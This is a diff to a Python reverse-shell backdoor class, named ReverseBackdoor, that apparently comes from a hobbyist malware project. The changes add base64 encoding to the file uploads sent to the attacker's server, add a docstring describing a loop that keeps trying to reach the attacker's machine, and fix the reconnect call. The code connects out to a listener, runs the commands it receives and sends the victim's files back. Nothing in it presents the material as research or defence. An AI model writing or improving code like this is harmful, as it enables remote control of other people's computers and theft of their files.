@@ -4,7 +4,7 @@ import subprocess
 import json
 import sys
 import os
-
+import base64
 
 class ReverseBackdoor:
 	'''
@@ -23,6 +23,10 @@ class ReverseBackdoor:
 	
 
 	def connect_to_listener(self):
+		'''
+		tries to connect to attacker's machine 
+		untill connected successfully. 
+		'''
 		connected = False
 		while not connected:
 			try:
@@ -33,10 +37,13 @@ class ReverseBackdoor:
 				print('\r[-] Connection Refused.', end='')
 
 
-	def serial_send(self, data:str or list):
+	def serial_send(self, data:str or list or bytes):
 		'''
 		serialize data and send over TCP socket.
 		'''
+		if type(data) == bytes:
+			data = str(data, encoding='utf-8')
+		
 		bytes_json_data = json.dumps(data).encode('utf-8')
 		# print('BD sent: ',bytes_json_data)
 		self.connection.send(bytes_json_data)
@@ -78,7 +85,9 @@ class ReverseBackdoor:
 		upload file contents to the attacker server.
 		'''
 		with open(path, 'rb') as file:
-			return file.read()
+			file_content = file.read()
+			base64_file_content = base64.b64encode(file_content)
+			return base64_file_content
 
 
 	def run(self):
@@ -91,12 +100,14 @@ class ReverseBackdoor:
 				
 				# remove below line
 				command_lst = command.split(' ')
+				# print(command_lst)
 				command_list_len = len(command_lst)==2
 				cmd = command_lst[0]
 				if command_list_len:
 					path = command_lst[1]
 				
 				if cmd == 'exit':
+					self.serial_send(' ')
 					self.connection.close()
 					sys.exit()
 				
@@ -114,9 +125,8 @@ class ReverseBackdoor:
 
 			except json.JSONDecodeError:
 				print('[-] Lost Connection.')
-				self.connect_to_listener
+				self.connect_to_listener()
 
 			except Exception as e:
 				exception = ('[-] Exception : ' + str(e))
 				self.serial_send(exception)
-
